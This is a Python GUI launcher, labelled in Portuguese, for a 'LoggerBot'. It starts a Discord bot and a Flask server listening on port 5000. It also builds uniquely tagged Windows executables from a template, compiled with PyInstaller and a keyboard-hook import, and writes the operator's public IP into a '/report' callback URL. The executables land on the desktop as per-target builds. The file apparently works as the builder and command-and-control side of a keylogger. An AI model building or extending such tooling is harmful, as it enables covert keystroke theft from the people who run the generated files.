import ctypes
import shutil
import tkinter as tk
from tkinter import messagebox
from dotenv import load_dotenv
import os
import threading
import uuid
import asyncio
import requests
import subprocess
import ipaddress
import socket
import time





from main import LoggerBot, app as flask_app

class LauncherApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Inicializador do LoggerBot")

        # Carrega valores do .env
        load_dotenv()
        self.default_token = os.getenv("TOKEN", "")
        self.default_guild = os.getenv("GUILD_ID", "")

        # pega IP público automaticamente
        try:
            self.default_ip = requests.get("https://api.ipify.org").text
        except Exception:
            self.default_ip = ""

        self.bot_instance = None

        # Interface
        tk.Label(root, text="Token do Bot:").pack()
        self.token_entry = tk.Entry(root, width=50)
        self.token_entry.insert(0, self.default_token)
        self.token_entry.pack()

        tk.Label(root, text="Guild ID:").pack()
        self.guild_entry = tk.Entry(root, width=50)
        self.guild_entry.insert(0, self.default_guild)
        self.guild_entry.pack()
        
        tk.Label(root, text="IP público do Bot:").pack()
        self.ip_entry = tk.Entry(root, width=50)
        self.ip_entry.insert(0, self.default_ip)  # já coloca automático
        self.ip_entry.pack()

        tk.Button(root, text="Iniciar Bot 🚀", command=self.start_bot).pack(pady=5)
        tk.Button(root, text="Parar Bot 🛑", command=self.stop_bot).pack(pady=5)
        tk.Button(root, text="Salvar Configuração 💾", command=self.save_config).pack(pady=5)

        self.status_label = tk.Label(root, text="🔴 Bot parado")
        self.status_label.pack(pady=10)

    def start_bot(self):
        token = self.token_entry.get().strip()
        guild_id = self.guild_entry.get().strip()
        ip_bot = self.ip_entry.get().strip()

        if not token or not guild_id or not ip_bot:
            messagebox.showerror("Erro", "Preencha todos os campos!")
            return

        # valida formato do IP
        try:
            ipaddress.ip_address(ip_bot)
        except ValueError:
            messagebox.showerror("Erro", f"IP inválido: {ip_bot}")
            return

        try:
            guild_id = int(guild_id)

            # gera executável da main
            main_id = self.gerar_main_exe()

            # cria instância do bot já com o main_id
            self.bot_instance = LoggerBot(token, guild_id, main_id)

            # registra instância no Flask
            import main
            main.bot_instance = self.bot_instance

            # inicia servidor Flask em thread separada
            threading.Thread(
                target=lambda: flask_app.run(host="0.0.0.0", port=5000),
                daemon=True
            ).start()

            # inicia o bot em thread separada
            threading.Thread(
                target=lambda: self.bot_instance.run(),
                daemon=True
            ).start()

            # espera alguns segundos para garantir que o Flask esteja pronto
            time.sleep(3)

            self.status_label.config(text="🟢 Bot rodando")
            messagebox.showinfo("Sucesso", f"Bot iniciado 🚀\nExecutável gerado com ID {main_id}")
        except Exception as e:
            messagebox.showerror("Erro", str(e))


    def stop_bot(self):
        if self.bot_instance and not self.bot_instance.bot.is_closed():
            # usa o loop guardado no LoggerBot
            loop = self.bot_instance.loop_ref
            asyncio.run_coroutine_threadsafe(self.bot_instance.bot.close(), loop)
            self.status_label.config(text="🔴 Bot parado")
        else:
            messagebox.showwarning("Aviso", "Nenhum bot está rodando.")

    def save_config(self):
        token = self.token_entry.get().strip()
        guild_id = self.guild_entry.get().strip()

        if not token or not guild_id:
            messagebox.showerror("Erro", "Preencha todos os campos!")
            return

        try:
            with open(".env", "w") as f:
                f.write(f"TOKEN={token}\n")
                f.write(f"GUILD_ID={guild_id}\n")
            messagebox.showinfo("Sucesso", "Configuração salva no .env ✅")
        except Exception as e:
            messagebox.showerror("Erro", str(e))

    def gerar_main_exe(self):
        main_id = str(uuid.uuid4())

        def build():
            # mostra status antes de começar
            self.status_label.config(text="⏳ Gerando executável...")

            # lê template
            with open("main_template.py", "r") as f:
                conteudo = f.read()

            conteudo = conteudo.replace('MAIN_ID = "uuid-gerado"', f'MAIN_ID = "{main_id}"')
            ip_bot = self.ip_entry.get().strip()
            conteudo = conteudo.replace("http://SEU_IP_DO_BOT:5000/report",
                                        f"http://{ip_bot}:5000/report")

            with open("main_gerada.py", "w") as f:
                f.write(conteudo)

            venv_python = os.path.join(os.getcwd(), ".venv", "Scripts", "python.exe")

            build_result = subprocess.run([
                venv_python, "-m", "PyInstaller",
                "--onefile", "--name", "main_gerada",
                "--hidden-import=requests",
                "--hidden-import=keyboard",
                "--hidden-import=flask",
                "main_gerada.py"
            ], capture_output=True, text=True)

            if build_result.returncode != 0:
                print("STDOUT:\n", build_result.stdout)
                print("STDERR:\n", build_result.stderr)
                messagebox.showerror("Erro", "Falha ao gerar o executável com PyInstaller.")
                self.status_label.config(text="❌ Falha ao gerar executável")
                return

            origem = os.path.abspath(os.path.join("dist", "main_gerada.exe"))

            # pega caminho correto da área de trabalho (independente do idioma)
            def get_desktop():
                CSIDL_DESKTOPDIRECTORY = 0x10
                SHGFP_TYPE_CURRENT = 0
                buf = ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
                ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_DESKTOPDIRECTORY, None, SHGFP_TYPE_CURRENT, buf)
                return buf.value

            desktop = get_desktop()
            destino = os.path.join(desktop, f"main_{main_id}.exe")

            if os.path.exists(origem):
                shutil.copy2(origem, destino)
                messagebox.showinfo("Sucesso", f"Executável gerado e copiado para: {destino}")
                self.status_label.config(text="✅ Executável pronto")
            else:
                messagebox.showwarning("Aviso", "O executável não foi encontrado na pasta dist.")
                self.status_label.config(text="⚠️ Executável não encontrado")

        threading.Thread(target=build, daemon=True).start()
        return main_id

if __name__ == "__main__":
    root = tk.Tk()
    app = LauncherApp(root)
    root.mainloop()